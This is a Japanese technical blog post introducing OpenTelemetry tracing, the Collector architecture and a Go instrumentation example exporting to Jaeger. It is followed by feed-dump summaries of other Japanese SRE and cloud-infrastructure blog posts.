あるリクエストに対するSpanのまとまりhttps://lightstep.com/opentelemetry/spans  より画像の引用Span はトレースの構成要素で、いくつかの情報を持ちます。複数のスパンをつなぎ合わせて、Trace を作成します。Trace は、多くの場合、各Span が開始および完了した時間を反映するSpan の「Tree」と見なされます。また、Span 間の関係も示します。Span の目的は、プログラムの実行に関する情報を観測可能なツールに提供することです。詳細が含まれている必要があり、Trace は全体像を把握するために必要な情報が含まれます。Loggingでは今後、トレースとリンクできるようにトレースIDを持つようになることが検討されてるようです。個々の情報を含むSpanName名前Start and End Timestamps終了と開始の時間Span ContextSpan Context は、Trace ID と Span IDを提供します。各Span は、Span ID と呼ばれるTrace 内で一意の ID によって識別されます。Span はTraceIDを使用して、Spanとそのトレース間の関係を識別します。Span は、サービスやプロセスの境界を越えて移動するために、Span Contextを必要とします。ログに含めることでログとSpan を紐付けることもできます。Attributesメタデータを含むキーと値のペアのことで、Spanにアノテーションを付けて、追跡している操作に関する情報を運ぶために使用します。Span EventsSpan Event は通常、Spanの期間中の重要で特異な時点を示すために使用されます。Span LinksSpan Links はオプションですが相互に関連付ける為に利用されます。Span StatusステータスはSpanに添付されます。通常、アプリケーションコードに例外などの既知のエラーがある場合は、Span Statusを設定します。Sample Span:        {          \\"trace_id\\": \\"7bba9f33312b3dbb8b2c2c62bb7abe2d\\",          \\"parent_id\\": \\"\\",          \\"span_id\\": \\"086e83747d0e381e\\",          \\"name\\": \\"/v1/sys/health\\",          \\"start_time\\": \\"2021-10-22 16:04:01.209458162 +0000 UTC\\",          \\"end_time\\": \\"2021-10-22 16:04:01.209514132 +0000 UTC\\",          \\"status_code\\": \\"STATUS_CODE_OK\\",          \\"status_message\\": \\"\\",          \\"attributes\\": {            \\"net.transport\\": \\"IP.TCP\\",            \\"net.peer.ip\\": \\"172.17.0.1\\",            \\"net.peer.port\\": \\"51820\\",            \\"net.host.ip\\": \\"10.177.2.152\\",            \\"net.host.port\\": \\"26040\\",            \\"http.method\\": \\"GET\\",            \\"http.target\\": \\"/v1/sys/health\\",            \\"http.server_name\\": \\"mortar-gateway\\",            \\"http.route\\": \\"/v1/sys/health\\",            \\"http.user_agent\\": \\"Consul Health Check\\",            \\"http.Scheme\\": \\"http\\",            \\"http.host\\": \\"10.177.2.152:26040\\",            \\"http.flavor\\": \\"1.1\\"          },          \\"events\\": {            \\"name\\": \\"\\",            \\"message\\": \\"OK\\",            \\"タイムスタンプ\\": \\"2021-10-22 16:04:01.209512872 +0000 UTC\\"          }        }全体像を示すTrace  OpenTelemetry のトレースがどのように機能するかを理解するために、コードの計装に関与するコンポーネントのリストを見てみましょう。TracerTracer は、サービス内のリクエストなど、与えられた操作で何が起こっているかについての詳細情報を含むSpanを作成します。Tracer はTracer Provider から作成されます。Tracer ProviderTracer Provider（TracerProviderと呼ばれることもあります）は、Tracerを生成します。ほとんどのアプリケーションでは、Tracer Provider は一度初期化され、そのライフサイクルはアプリケーションのライフサイクルと一致します。Tracer Providerの初期化には、ResourceとExporterの初期化も含まれます。Trace ExporterTrace Exportersは、Trace をコンシューマーに送信します。このconsumer は、デバッグおよび開発時の標準出力、OpenTelemetry Collector、または任意のオープンソースまたはベンダーのバックエンドにすることができます。Trace Contextトレースコンテキストは、トレーススパンに関するメタデータで、サービスやプロセスの境界を越えてスパン間の相関関係を提供します。例えば、サービス A がサービス B を呼び出し、その呼び出しをトレースで追跡したいとします。この場合、OpenTelemetry はトレースコンテキストを使用して、サービス A からトレースの ID と現在のスパンを取得し、サービス B で作成されたスパンがトレースに接続し追加することができるようにします。これは、Context Propagation（コンテキスト伝播）と呼ばれています。Sample Trace        {            \\"name\\": \\"Hello-Greetings\\",            \\"context\\": {                \\"trace_id\\": \\"0\xd75b8aa5a2d2c872e8321cf37308d69df2\\",                \\"span_id\\": \\"0\xd75fb397be34d26b51\\",            },            \\"parent_id\\": \\"0\xd7051581bf3cb55c13\\",            \\"start_time\\": \\"2022-04-29T18:52:58.114304Z\\",            \\"end_time\\": \\"2022-04-29T18:52:58.114435Z\\",            \\"attributes\\": {                \\"http.route\\": \\"some_route1\\"            },            \\"events\\": [                {                    \\"name\\": \\"hey there!\\",                    \\"タイムスタンプ\\": \\"2022-04-29T18:52:58.114561Z\\",                    \\"attributes\\": {                        \\"event_attributes\\": 1                    }                },                {                    \\"name\\": \\"bye now!\\",                    \\"タイムスタンプ\\": \\"2022-04-29T22:52:58.114561Z\\",                    \\"attributes\\": {                        \\"event_attributes\\": 1                    }                }            ],        }        {            \\"name\\": \\"Hello-Salutations\\",            \\"context\\": {                \\"trace_id\\": \\"0\xd75b8aa5a2d2c872e8321cf37308d69df2\\",                \\"span_id\\": \\"0\xd793564f51e1abe1c2\\",            },            \\"parent_id\\": \\"0\xd7051581bf3cb55c13\\",            \\"start_time\\": \\"2022-04-29T18:52:58.114492Z\\",            \\"end_time\\": \\"2022-04-29T18:52:58.114631Z\\",            \\"attributes\\": {                \\"http.route\\": \\"some_route2\\"            },            \\"events\\": [                {                    \\"name\\": \\"hey there!\\",                    \\"タイムスタンプ\\": \\"2022-04-29T18:52:58.114561Z\\",                    \\"attributes\\": {                        \\"event_attributes\\": 1                    }                }            ],        }        {            \\"name\\": \\"Hello\\",            \\"context\\": {                \\"trace_id\\": \\"0\xd75b8aa5a2d2c872e8321cf37308d69df2\\",                \\"span_id\\": \\"0\xd7051581bf3cb55c13\\",            },            \\"parent_id\\": null,            \\"start_time\\": \\"2022-04-29T18:52:58.114201Z\\",            \\"end_time\\": \\"2022-04-29T18:52:58.114687Z\\",            \\"attributes\\": {                \\"http.route\\": \\"some_route3\\"            },            \\"events\\": [                {                    \\"name\\": \\"Guten Tag!\\",                    \\"タイムスタンプ\\": \\"2022-04-29T18:52:58.114561Z\\",                    \\"attributes\\": {                        \\"event_attributes\\": 1                    }                }            ],        }\uD83D\uDCA1 そのサービスを開発した開発者や初期から参加しているメンバーであれば、特定のリクエストが各サービス(関数)を利用しているのかある程度は把握していると思います。しかし、案件に途中で入ったり、運用をしていくエンジニアからすればそれがどのように繋がっているかなどの情報はドキュメントやログ、実際に実装を見ていく以外に方法がありません。あればあるで嬉しいが無いならないでなんとかなるのもトレーシングが普及しない問題点の一つではないかと邪推しておく。OpenTelemetry Collectorとはhttps://opentelemetry.io/docs/collector/OpenTelemetry Collector は、テレメトリデータの受信、処理、エクスポートの方法について、ベンダーに依存しない実装を提供します。OpenTelemetry Collector は、計装と収集を標準化でいうところの収集を主に担当します。アプリケーションとテレメトリデータの中継役として動作するため各ベンダー固有のテレメトリデータをバックエンド(Jaeger、Prometheus、Fluent Bitなど)の対応したデータ形式に変換したりといった役割を持ちます。そのため、複数のエージェント/コレクタを実行、操作、保守する必要がなくなります。Collector のメリット使いやすさ: デフォルトの設定を用意、よくあるプロトコルのサポート、そのまま使えるパフォーマンス: さまざまな負荷や構成に対応できるように設定することもできますオブザーバビリティ: それ自体が観測可能である拡張性: コアコードに手を入れることなく拡張が可能統合: 単一のコード、エージェントでまたはコレクターとして配置可能でトレース、メトリック、ログ(将来)を扱うOpenTelemetry Collectorは、AgentとGatewayの2つのデプロイメント方法から選ぶことができます。Agent: アプリケーションとともに、またはアプリケーションと同じホストで実行されるCollector インスタンス(バイナリ、サイドカー、デーモンセットなど)Gateway: 通常、クラスタ、データセンター、地域ごとに単独のサービス（コンテナやデプロイメントなど）として稼働する1つまたは複数のCollectorインスタンス。OpenTelemetry Collector Architecture とはhttps://github.com/open-telemetry/opentelemetry-collector/blob/main/docs/design.mdOpenTelemetry Collector Architectureは大まかにReceiver、Processor、Exporterの3つの要素で構成されいます。Receiversどういうフォーマットでどのようにテレメトリデータを受信するかという設定サードパーティのテレメトリデータを受け取って、内部的にTraceとSpanに変換する役割を持つProcessorsテレメトリデータの加工、フィルター、リトライ、バッチ処理等の設定Receiverから送られてきたTraceとSpan情報を特定の条件で加工するExportersテレメトリデータのエクポートに関する設定Processorから送られてきたデータを、Export先のデータ形式に変換し、送信するOpenTelemetry Collector の設定ファイル    receivers:      otlp:        protocols:          grpc:          http:      otlp/2:        protocols:          grpc:            endpoint: 0.0.0.0:55690        processors:      batch:      batch/test:        exporters:      otlp:        endpoint: otelcol:4317      otlp/2:        endpoint: otelcol2:4317        extensions:      health_check:      pprof:      zpages:        service:      extensions: [health_check,pprof,zpages]      pipelines:        traces:          receivers: [otlp]          processors: [batch]          exporters: [otlp]        traces/2:          receivers: [otlp/2]          processors: [batch/test]          exporters: [otlp/2]        metrics:          receivers: [otlp]          processors: [batch]          exporters: [otlp]        logs:          receivers: [otlp]          processors: [batch]          exporters: [otlp]OpenTelemetry とSDKとパッケージhttps://opentelemetry.io/docs/concepts/instrumenting/OpenTelemetryプロジェクトは、各言語ごとにテレメトリデータを送信するパッケージが用意されています。これらはアプリケーションの計測を容易にします。インストルメンテーションライブラリは、言語ごとにコアリポジトリを提供します。自動計測または非コアコンポーネント用の追加のリポジトリを提供する場合と提供しない場合があります。opentelemetry-goTracing はStableGoのコアリポジトリでありテレメトリデータ作成機能やJaeger、Zipkinといった主要なOSSやOTLPにテレメトリデータをexportするための機能を提供しています。Metrics はAlphaメトリクスの機能はまだAlpha提供でいくつかのIssue は積まれている状態  OpenTelemetry Go: Metric SDK * open-telemetryLogging はFrozenTracing のMetrics 2つの機能開発をやっているのでそれらが終わるまではIssue を認めないがopentelemetry-go-contribコア機能でないものや、その他のオープンソースや商用のバックエンドのための実装を含みます。Go言語の場合にここに計装系のコードも含まれているOpenTelemetry と自動計装https://opentelemetry.io/docs/concepts/instrumenting-library/OpenTelemetryプロジェクトは、各言語ごとにテレメトリデータを送信するパッケージが用意されていますが、ライブラリーによっては全てを実装しなくてもよいことがあります。全てとはOpenTelemetry Trace は以下のような手順で作成されます。これらを全て自分でやるのは流石に骨が折れる作業です。1. Exporter 作成2. TracerProvider作成3. Tracer取得4. Span作成上記の手順を生のAPIを叩いても実施してもよいのですが、アプリケーションの特定のミドルウェアやフレームワークとのインタフェースがinstrumentationとして提供されており、2~4 を自動で取得することができます。トレース情報を取り出す便利ライブラリがいくつもあります(トレース、メトリクス、ロギングの全てが自動で取得できる世界線までもう少し)。\uD83D\uDCDD Registry はOpenTelemetry で利用されるライブラリ、プラグイン、およびその他の便利なツールを確認することができるので確認など確認してみると自分で利用したいツールなどが見つかるかもしれません。https://opentelemetry.io/registry/OpenTelemetryとhttptrace.ClientTraceを使ってHTTPリクエストのlatencyを可視化する を参考にコードを作成しました。OpenTelemetry Collector は使用せずにJaeger のエンドポイントを叩いてる    package main        import (      \\"context\\"      \\"log\\"      \\"net/http\\"      \\"net/http/httptrace\\"          _ \\"go.opencensus.io/resource\\"      _ \\"go.opencensus.io/trace\\"      \\"go.opentelemetry.io/otel/attribute\\"      \\"go.opentelemetry.io/otel/exporters/jaeger\\"      \\"go.opentelemetry.io/otel/sdk/resource\\"      \\"go.opentelemetry.io/otel/sdk/trace\\"      semconv \\"go.opentelemetry.io/otel/semconv/v1.10.0\\"          \\"go.opentelemetry.io/contrib/instrumentation/net/http/httptrace/otelhttptrace\\"      \\"go.opentelemetry.io/otel\\"    )        func main() {      tracerProvider, err := NewTracerProvider(\\"otelhttp_client_trace\\")      if err != nil {          log.Fatal(err)      }      defer func() {          if err := tracerProvider.Shutdown(context.Background()); err != nil {              log.Fatal(err)          }      }()      otel.SetTracerProvider(tracerProvider)          ctx := context.Background()      ctx, span := tracerProvider.Tracer(\\"main\\").Start(ctx, \\"main\\")      defer span.End()          if err := httpGet(ctx, \\"https://3-shake.com/\\"); err != nil {          log.Fatal(err)      }    }        func httpGet(ctx context.Context, url string) error {      ctx, span := otel.Tracer(\\"main\\").Start(ctx, \\"httpGet\\")      defer span.End()      span.SetAttributes(attribute.Key(\\"url\\").String(url))          clientTrace := otelhttptrace.NewClientTrace(ctx)      ctx = httptrace.WithClientTrace(ctx, clientTrace)      req, err := http.NewRequestWithContext(ctx, \\"GET\\", url, nil)      if err != nil {          return err      }      _, err = http.DefaultClient.Do(req)      if err != nil {          return err      }      return nil    }        func NewTracerProvider(serviceName string) (*trace.TracerProvider, error) {      // Port details: https://www.jaegertracing.io/docs/getting-started/      collectorEndpointURI := \\"http://localhost:14268/api/traces\\"          exporter, err := jaeger.New(jaeger.WithCollectorEndpoint(jaeger.WithEndpoint(collectorEndpointURI)))      if err != nil {          return nil, err      }          r := NewResource(serviceName, \\"v1\\", \\"local\\")      return trace.NewTracerProvider(          trace.WithBatcher(exporter),          trace.WithResource(r),          trace.WithSampler(trace.TraceIDRatioBased(1)),      ), nil    }        func NewResource(serviceName string, version string, environment string) *resource.Resource {      r, _ := resource.Merge(          resource.Default(),          resource.NewWithAttributes(              semconv.SchemaURL,              semconv.ServiceNameKey.String(serviceName),              semconv.ServiceVersionKey.String(version),              attribute.String(\\"environment\\", environment),          ),      )      return r    }それらをjaeger (イエーガー)に食べさせた結果がこれ今後のOpentelemetry についてhttps://www.cncf.io/blog/2022/07/07/opentelemetry-roadmap-and-latest-updates/各ライブラリーでの対応は別としてこのような発言もあります。Realistically at this point in time, I don’t expect logging to be stable until the end of the year at the earliest but I’d say early next year.現実的に現時点では、ロギングが安定するのは早くても年末ですが、来年の早いタイミングだとは思います。-> OpenTelemetry  を取り巻く環境は来年2023年4月ぐらいにもう一度取り扱いと思います。他にも以下のようなトピックに触れておりました。OpenTelemetryがMetricsのRCに到達.Logs の仕様が安定、Logs Beta の予定.OpenTelemetryへのリアルユーザーモニタリングの追加.OpenTelemetryへの継続的プロファイリングの追加.リモートエージェント管理による操作性の向上.OpenTelemetryに4317番ポートが登録.eBPFとその他のアップデート.とても気になるトピックが多くありますがこの記事では紹介しません。次回予告:OpenTelemetry とOpenTelemetry Collectorを使ったTracingとMetricsをアプリケーションで利用する方法ざっくりとではありましたがOpenTelemetryに関する技術要素とその概要をまとめました。野心的なプロジェクトでまだ道半ばですが個人的には将来がとても楽しみです。OpenTelemetry とOpenTelemetry Collectorを使ったTracingとMetricsをアプリケーションで利用する場合、基本的な流れは次のようになります。# Tracing 1. Exporter 作成2. TracerProvider作成3. Tracer取得4. Span作成# Metrics1. Exporter 作成2. MeterProvider　作成3. Meter 作成4. Instrument　作成5. Measurement 作成上記に関しては社内ハンズオンなどで実施していきたいと思います。社内共有会で利用したものだからといって公開するにあたって参照を記載する際に気をつけることを学びました。良い学びです。SRE サイトリライアビリティエンジニアリング ―Googleの信頼性を支えるエンジニアリングチームオライリージャパンAmazon参照リンクOpenTelemetryhttps://opentelemetry.io/ OpenTelemetry roadmap and latest updates https://www.cncf.io/blog/2022/07/07/opentelemetry-roadmap-and-latest-updates/ Spans in OpenTelemetry https://lightstep.com/opentelemetry/spansOpenTelemetryのこれまでとこれからhttps://event.cloudnativedays.jp/o11y2022/talks/1347入門 OpenTelemetry Collectorhttps://event.cloudnativedays.jp/o11y2022/talks/1354OpenTelemetryとgo-chiを繋げてみるhttps://future-architect.github.io/articles/20211020a/ OpenTelemetryとhttptrace.ClientTraceを使ってHTTPリクエストのlatencyを可視化する https://journal.lampetty.net/entry/opentelemetry-httptrace AWS Distro for OpenTelemetry https://aws.amazon.com/jp/otel/ Go と OpenTelemetry https://cloud.google.com/trace/docs/setup/go-ot","link":"https://syu-m-5151.hatenablog.com/entry/2022/07/12/115434","isoDate":"2022-07-12T02:54:34.000Z","dateMiliSeconds":1657594474000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"【Codezine掲載】SREは運用チームだけの問題？ 開発者のメリットをGoogle\xd7スリーシェイクがプラクティスとともに解説！","contentSnippet":"「デベロッパーの成長と課題解決に貢献するメディア」をコンセプトに情報発信を行うソフトウェア開発者向けWebメディア「Codezine」に、Srekae事業部部長手塚の対談記事が掲載されました。The post 【Codezine掲載】SREは運用チームだけの問題？ 開発者のメリットをGoogle\xd7スリーシェイクがプラクティスとともに解説！ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/codezine_sre_google/","isoDate":"2022-07-07T06:46:00.000Z","dateMiliSeconds":1657176360000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kyashを退職しました","contentSnippet":"退職エントリです。6月末をもって3年2ヶ月勤めたKyashを退職しました。KyashでやったことKyashでは2つの事業に携わりました。Kyash Direct2019年4月に入社してすぐに、立ち上げ中だったKyash Directに携わりました。Goによるマイクロサービス構成、Clean Architecture、Event Sourcing、CQRSなど初めて触れる技術や設計に翻弄されながら、サーバサイドの実装、Visa決済基盤の実装、QA(品質保証)基盤の構築、導入企業様への技術的サポートなどに携わりました。GA版リリースの日はチームのみんなと26時までリリース作業に追われ、深夜のタクシー帰宅の実績を解除したのがいい思い出です。最終的には事業譲渡となったためKyashでの開発はストップし、開発運用ノウハウを譲渡先企業様にレクチャーしたり、3度にわたる深夜メンテナンスで大量のインフラリソースを引っ越したり、バタバタしたお別れでした。ウォレットアプリKyash2021年の9月頃からウォレットアプリKyashのサーバサイド開発に携わりました。古より引き継がれし歴史あるコード群とにらめっこしながら銀行への出金、マイナポイント、本人確認(eKYC)、共有口座、Kyashリワード、楽天銀行入金などの機能開発に携わりました。こうやって挙げてみると世に出せなかったものも含めてもたくさんのリリースに関わっていたのだなぁと感じます。名の通った企業による○○Payやデビットカードの進化、海外発Fintechの上陸などキャッシュレスの荒波をモロに受けたよい経験になりました。これから3年ほどサーバサイドエンジニアとしてやってきたので、次はインフラ分野に挑戦してみたいと考えています。サーバサイドに軸足を置きつつ新しい環境で新たな領域を勉強します。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2022/06/30/000000?utm_source=feed","isoDate":"2022-06-29T15:00:00.000Z","dateMiliSeconds":1656514800000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Datadogのログ管理コストをフィルター機能で削減をする","contentSnippet":"今回は、Datadogの料金体系に関するお話と、実際の案件で発生したコスト削減の対応を行ったお話をご紹介していきたいと思います。The post Datadogのログ管理コストをフィルター機能で削減をする first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/datadog_cost_filter/","isoDate":"2022-06-28T03:04:27.000Z","dateMiliSeconds":1656385467000,"authorName":"Sreake","authorId":"Sreake"},{"title":"S3にアーカイブしたDatadogのログを復元する","contentSnippet":"Datadogのログにまつわるお話を紹介させていただきます！今回はアーカイブされたログをDatadogで見たい場合どのように復元していくのかについてご紹介しますThe post S3にアーカイブしたDatadogのログを復元する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/s3_datadog_log/","isoDate":"2022-06-28T03:04:23.000Z","dateMiliSeconds":1656385463000,"authorName":"Sreake","authorId":"Sreake"},{"title":"インフラコードのテストツール Terratest を触ってみた","contentSnippet":"Terratest の概要 公式HP:\xa0https://terratest.gruntwork.io/ Githubリポジトリ:\xa0https://github.com/gruntwork-io/ter […]The post インフラコードのテストツール Terratest を触ってみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/learn-about-terratest/","isoDate":"2022-06-27T00:43:53.000Z","dateMiliSeconds":1656290633000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AWS SAP 合格体験記 2022/06","contentSnippet":"はじめにネットで公開されている数々のAWS Certified Solutions Architect - Professionalの合格体験記や勉強法などにお世話になったので自分も書いてみることにしました。教材選びや学習スケジュールの参考になれば嬉しいです。 私の前提知識まず、本題に入る前に私のSAPを受ける前までのスキルセットを軽く紹介させてください。業務でのAWS歴は8ヶ月ほどで現在SREとして働いています以前はRuby on Railsなどを書くプログラマーをやっていましたAWS SAAは2022/03に取得しましたAWSではない他のIT資格は以下で...","link":"https://zenn.dev/tayusa/articles/7b3dd99a79403c","isoDate":"2022-06-24T00:36:49.000Z","dateMiliSeconds":1656031009000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"SRE に成る君に最低限の開発力を身に着けてほしい","contentSnippet":"はじめにまず、はじめに皆さんへ言っておきたいことがあります。このドキュメントの目的は皆さんをやる気にさせて一心不乱にコードを書きまくって新機能追加や改善をしてソフトウェアを開発していってほしいというわけではないということです。もちろん、そうなってくれれば嬉しいですが気合が入ったからプログラムを急に書けるようになるわけではないのでそのような目的は一切ありません。また、この文章にはインフラエンジニアがコードを読み書きできなくて良いという意図はなくポジショニングトーク的にSREという単語を利用しておりますので何も言わないでください。SREはそもそも、コードを書かなくてもよいエンジニアではないSREとは、ITサービスの信頼性を高めるために、ITエンジニア（開発者）が信頼性向上のために行う設計やアプローチ、またはこれらを行うチームや役割を指します。Google では、SREチームの50～60%は「Google のソフトウェアエンジニア」で、残りの40～50%は「正規のエンジニア『予備軍』だが、他のメンバーには持っていないスキルを持っているエンジニア(インフラ技術に特化した人材)」を選定しています。そして、そのチームは自動化・省力化するために積極的にプログラムを書く。SREが「System Administrator」ではない最大の特徴は、システムの拡大に伴い、保守運用工数が正比例して増大することのないように、自分たちでプログラムを書いて積極的に自動化・省力化を行います。が今更、そんなことを言うつもりはない。SREで大事なところはそこではない。大切なのは役割や役職としてのSREではなくSREのプラクティスであると思う。「SREの探求」でもそれは１言及されているので異論がある方は読んでから議論しましょう。www.oreilly.co.jpインフラエンジニアからSREになるということSRE　≠　インフラエンジニアという認識は皆さんにもあるとは思います。そもそも、開発力が皆無でコードの読み書きが選択肢になければ問題が起きた時に挙動を把握し続け、ログやメトリクスでとことん確かめていきます。何が起きてるか事実ベースで完全に外からの推論だけで把握するというのは難しい、もしくは不完全です。コードを読めなければ問題を解決するのはいつも本当の偶然か、計画的な偶然か、もしくはそれらを超越した熟練者の直感によるものが多いです。もちろん、直感は素晴らしいです。なぜなら、熟練者の直感は問題が起きた時に直感で全ての問題を見つけて解決していくからです。それらは、高度で本人にさえ言語化不能で本当に超能力者みたいです。私はそのような能力をまだ持ち合わせていないです。が、問題は起きていて解決は迫られてます。直感を身につけるような時間はもう、残されていません。明日の朝にはこの問題を解決して納品しなければリリースに間に合わない。解決や期間的な目処は立てなければなりません。もし、解決方法もどれだけで解決するかも分からないとなればプロジェクトに関わるメンバーは不安になると思います。自社開発のソフトウェアで、自社のエンジニアが書いたコードあればそのエンジニアか所属する組織への依頼をすれば良いでしょう。ですがSREは自社のソフトウェアだけではなくOSSと向き合っていることも多く不具合を気軽に相談できない場合も多いです。私に起こった不具合が設定値によるものなのか？ 実装によるものなのか？ を切り分けができなければOSSのIssue も出すことができません。ちなみに、有償サポートでは、その限りではないと思います(有償サポートがあるなら頼れ)。ソフトウェアを読めることで、問題が起きた時にコードを読み尽くして、負荷試験や本番で挙動を把握し続け、ログやメトリクスでとことん確かめていけばシステムに対する解像度が上がります。プログラムをちゃんと読めて原因の特定、修正がコードレベルでできるようになるという選択肢は確実性を高めます。そのため、ソフトウェアの開発経験がないエンジニアのためにOJTに開発経験を追加してそういった素地を最初に作ってもらいたいと思っています。システムへの解像度をあげてエンジニアとしてのレベルを上げる問題が起こったらログやメトリクスから情報を収集して推論して対応していくことも当たり前のように重要である。しかし、運用をしていたらそれでは解決しない問題にぶつかることもある。そのため、以下のような習慣を是非、身につけてほしいと思っています。各項目についてはこのブログでは深く記載しませんがぜひ、深堀りしてみてください。1.コードがあったら読むコードが読めなければ障害やアラートの原因が最終的に神の怒りになる。OSSの動きが不思議だったら、外から動作を推測するよりコードを読んだ方が確実案件でコードが公開されているなら、それもコードを読んだほうが確実天才ではない限り読んだことの無いコードは書けない。2.Strace でシステムコールを追うLinux にはあるプロセスが呼び出している system call を確認できるコマンドがある使えるといろいろと重宝するので使えるようになりましょう例)パーミッションエラーが発生したがどこが悪いのかログに出てきてない！こんなときにはStraceだ！！！最終的にはLinux プログラミングインターフェースと旅行に行きましょう！それでもダメなら起動せよ！デバッガー(gdbとdelve)！CPUやメモリのボトルネックを調査するためにプロファイリングツール(pprof など) を利用する3. ネットワークトラブル時はTCPパケットを追うパケットは友達！パケットは嘘を付きません！RSTが返されているとか、応答自体がきていないなどの切り分けが必要ログやメトリクスだけではどうしても追いきれない場合がある4.技術ドキュメントを書く検討結果はもちろん、検討過程や思考を記録に残すことが大事色々なやり方がある場合には「〜をする5つの方法」のような書き方構造品質を保つ(構成が適切か、単語ミスはないか、口調はそろっているか、文法は正しいか、textlintをかけているか、構成テンプレートに沿っているか)機能品質を保つ(サービスやビジネスの継続に価値を発揮できているか？)5. OSSのバグがあったら報告するOSS のドキュメントでも良いのでフリーライドしすぎない開発力が必要になるので身につくいつか、一緒に働いてくれるかもしれない誰かが見てるかもしれないさいごにというような社内ポエムを爆誕させていたらそこそこ反応が良かったので再編集してブログにしておきました。もちろん、開発力も大事ですがそれらを通して原理原則を理解して自走しながら課題解決し続ける人の方がもっと価値のあることだとは思っております。皆さんSREへの修行もしくは鍛錬がてら入社を待ってます！3-shake.com去年から同じようなこと言っていてますね、、。syu-m-5151.hatenablog.comSRE サイトリライアビリティエンジニアリング ―Googleの信頼性を支えるエンジニアリングチームオライリージャパンAmazon","link":"https://syu-m-5151.hatenablog.com/entry/2022/06/23/153827","isoDate":"2022-06-23T06:38:27.000Z","dateMiliSeconds":1655966307000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"istio-proxy の log level を変更する","contentSnippet":"Istio でよくわからない通信の問題が発生した際、Envoy の access log だけでは何が起きているのかわからない場合があります。そんなとき、当該 Pod の LogLevel を debug に変更することで得られる","link":"https://blog.1q77.com/2022/06/istio-proxy-log-level/","isoDate":"2022-06-07T07:34:29.000Z","dateMiliSeconds":1654587269000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Mizu で kubernetes 内の通信を覗く (part 1)","contentSnippet":"Mizu - API Traffic viewer for Kubernetes というものの存在を知ったので試してみます。 サイトには次のように書いてあります。気になります。 Mizu offers a real-time view of all HTTP requests, REST and gRPC API calls, as well as Kafka, AMQP (activeMQ / RabbitMQ), and Redis. HTTP も gRPC","link":"https://blog.1q77.com/2022/06/using-mizu-part-1/","isoDate":"2022-06-04T16:04:52.000Z","dateMiliSeconds":1654358692000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"istio-proxyがどのように通信を仲介しているかを知る","contentSnippet":"目的前回、書いた記事で素のKubernetesのネットワークについて少し理解できたのですが、Istioを入れた場合はEnvoyが通信を仲介するのでその仕組みを知りたく調べてみましたhttps://zenn.dev/tayusa/articles/c705cd65b6ee74 環境OS: Arch Linux(5.17.9-arch1-1)k8sの環境: kindhttps://kind.sigs.k8s.io/version 0.14.0デフォルトのk8sのバージョンは1.24 クラスタのセットアップ kindでクラスタ作成https:...","link":"https://zenn.dev/tayusa/articles/aa54bbff3d0d2d","isoDate":"2022-06-03T18:42:53.000Z","dateMiliSeconds":1654281773000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"【Codezine掲載】システムの信頼性を高める、クラウドネイティブ実践のコツとは？ 青山真也氏\xd7スリーシェイクが語る「これまで」と「これから」","contentSnippet":"「デベロッパーの成長と課題解決に貢献するメディア」をコンセプトに情報発信を行うソフトウェア開発者向けWebメディア「Codezine」に、Srekae事業部部長手塚の対談記事が掲載されました。The post 【Codezine掲載】システムの信頼性を高める、クラウドネイティブ実践のコツとは？ 青山真也氏\xd7スリーシェイクが語る「これまで」と「これから」 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/codezine_cloudnative/","isoDate":"2022-06-03T06:31:00.000Z","dateMiliSeconds":1654237860000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Karpenter について調べてみた","contentSnippet":"2021年の re:invent にて GA となったことが発表された、Karpenter について調べてみたのでその共有となります。 公式HP: https://karpenter.sh/ リポジトリ: https:/ […]The post Karpenter について調べてみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/learn-about-karpenter/","isoDate":"2022-05-30T01:38:25.000Z","dateMiliSeconds":1653874705000,"authorName":"Sreake","authorId":"Sreake"},{"title":"KubernetesのServiceの挙動を確認する","contentSnippet":"目的普段、Kubernetesを触ってはいるのですが、表面的な使い方しか知らないので動きを確認してみます 環境OS: Arch Linux(5.17.9-arch1-1)k8sの環境: kindhttps://kind.sigs.k8s.io/version 0.14.0デフォルトのk8sのバージョンは1.24 ひとまず、ローカルでクラスタを立てる環境に応じてkindをインストールhttps://kind.sigs.k8s.io/docs/user/quick-start/#installationクラスタの作成$ kind ...","link":"https://zenn.dev/tayusa/articles/c705cd65b6ee74","isoDate":"2022-05-28T12:19:47.000Z","dateMiliSeconds":1653740387000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"朝活として最高の書籍である『システム運用アンチパターン』を読んだので読書感想文","contentSnippet":"はじめにSREという信頼性の観点からのプラクティスや運用技術を実施出来るためのプロダクトの開発をしている身からすると『システム運用アンチパターン』はまさに様々な課題がわかりやすく言語化されており素晴らしい書籍で、熟練の運用エンジニアとお話ができるような経験ができました。このエントリーは『システム運用アンチパターン』を読んでみた中での感想文となります。www.oreilly.co.jp『システム運用アンチパターン』目次1章　DevOpsを構成するもの1.1　DevOpsとは？1.2　DevOpsの柱となるCAMS1.3　また別のDevOps本？1.4　本章のまとめ2章　パターナリスト症候群2.1　安全装置ではなく障壁を作ってしまう2.2　ゲートキーパーの導入2.3　ゲートキーパーの分析2.4　自動化によるパターナリスト症候群の解消2.5　承認の目的を把握する2.6　自動化のためのコードの構成2.7　継続的な改善に向けて2.8　本章のまとめ3章　盲目状態での運用3.1　苦労話3.2　開発と運用の役割を変える3.3　プロダクトの理解3.4　運用の可視化3.5　ログを価値のあるものにする3.6　本章のまとめ4章　情報ではなくデータ4.1　データではなく利用者から始める4.2　ウィジェット：ダッシュボードの構成要素4.3　ウィジェットに文脈を与える4.4　ダッシュボードの構成4.5　ダッシュボードの命名4.6　本章のまとめ5章　最後の味付けとしての品質5.1　テストピラミッド5.2　テストの構造5.3　テストスイートの信頼性5.4　